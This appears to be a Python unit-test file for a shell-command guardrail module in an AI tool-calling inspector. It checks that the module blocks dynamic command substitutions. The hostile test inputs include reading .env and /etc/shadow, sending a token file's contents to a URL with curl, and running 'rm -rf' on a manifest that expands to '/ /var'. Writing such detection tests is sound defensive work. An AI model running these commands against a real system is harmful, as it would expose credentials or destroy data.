"""Unit tests for Dynamic Substitution Tool-Calling Inspector & 5 Guardrails."""

import os
import sys
import tempfile
from pathlib import Path

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))

from security_evaluator import (
    safe_read_file_content,
    audit_shell_command,
    DYNAMIC_SUBSTITUTION_PATTERN,
)


import unittest

class TestDynamicSubstitution(unittest.TestCase):
    def test_guardrails(self):
        # Guard 1: Sensitive file blocked
        success, msg = safe_read_file_content(".env")
        self.assertFalse(success, f"Expected .env to be blocked, got: {msg}")

        # Guard 2: System directory blocked
        success, msg = safe_read_file_content("/etc/shadow")
        self.assertFalse(success, f"Expected /etc/shadow to be blocked, got: {msg}")

        # Guard 3: Safe regular file read
        with tempfile.NamedTemporaryFile("w", delete=False) as f:
            f.write("build/app.js\nbuild/index.html")
            tmp_path = f.name

        try:
            success, content = safe_read_file_content(tmp_path)
            self.assertTrue(success, f"Expected safe read to succeed, got: {content}")
            self.assertIn("build/app.js", content)
        finally:
            os.unlink(tmp_path)

    def test_pattern_detection(self):
        # Should match
        self.assertTrue(DYNAMIC_SUBSTITUTION_PATTERN.search("cp $(cat safe_list.txt) ~/dest/"))
        self.assertTrue(DYNAMIC_SUBSTITUTION_PATTERN.search("rm `cat list.txt`"))
        self.assertTrue(DYNAMIC_SUBSTITUTION_PATTERN.search("curl http://example.com/$(<token.txt)"))
        self.assertTrue(DYNAMIC_SUBSTITUTION_PATTERN.search("cp $(find . -name '*.txt') ~/dest/"))

        # Static commands should NOT match
        self.assertFalse(DYNAMIC_SUBSTITUTION_PATTERN.search("cp file1.txt file2.txt"))
        self.assertFalse(DYNAMIC_SUBSTITUTION_PATTERN.search("ln -sfn src dst"))
        self.assertFalse(DYNAMIC_SUBSTITUTION_PATTERN.search("mkdir -p ~/new_dir"))

    def test_deterministic_dynamic_substitution_resolution(self):
        # 1. Safe dynamic substitution with temporary manifest
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f_target:
            f_target.write("hello world")
            target_path = f_target.name

        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f_manifest:
            f_manifest.write(target_path)
            manifest_path = f_manifest.name

        try:
            # Test $(cat ...)
            safe, reason, layer = audit_shell_command(f"cat $(cat {manifest_path})")
            self.assertTrue(safe, f"Expected safe $(cat ...) resolution, got: {reason}")
            self.assertEqual(layer, "FAST_TRACK_AST")

            # Test $(< ...)
            safe, reason, layer = audit_shell_command(f"cat $(< {manifest_path})")
            self.assertTrue(safe, f"Expected safe $(< ...) resolution, got: {reason}")
            self.assertEqual(layer, "FAST_TRACK_AST")

            # Test `cat ...`
            safe, reason, layer = audit_shell_command(f"cat `cat {manifest_path}`")
            self.assertTrue(safe, f"Expected safe `cat ...` resolution, got: {reason}")
            self.assertEqual(layer, "FAST_TRACK_AST")
        finally:
            if os.path.exists(target_path):
                os.unlink(target_path)
            if os.path.exists(manifest_path):
                os.unlink(manifest_path)

    def test_dynamic_substitution_security_blocks(self):
        # 1. Direct .env access via dynamic substitution
        safe, reason, layer = audit_shell_command("cat $(cat .env)")
        self.assertFalse(safe, "Expected cat $(cat .env) to be blocked")
        self.assertEqual(layer, "SECRET_GUARD")

        # 2. System path access via dynamic substitution
        safe, reason, layer = audit_shell_command("cat $(cat /etc/shadow)")
        self.assertFalse(safe, "Expected cat $(cat /etc/shadow) to be blocked")
        self.assertIn(layer, ("SHELL_CRITICAL", "SECRET_GUARD"))

        # 3. Dynamic substitution expanding to destructive command
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f_manifest:
            f_manifest.write("/ /var")
            manifest_path = f_manifest.name

        try:
            safe, reason, layer = audit_shell_command(f"rm -rf $(cat {manifest_path})")
            self.assertFalse(safe, "Expected rm -rf expansion to be blocked")
            self.assertEqual(layer, "SHELL_CRITICAL")
        finally:
            if os.path.exists(manifest_path):
                os.unlink(manifest_path)


if __name__ == "__main__":
    unittest.main()
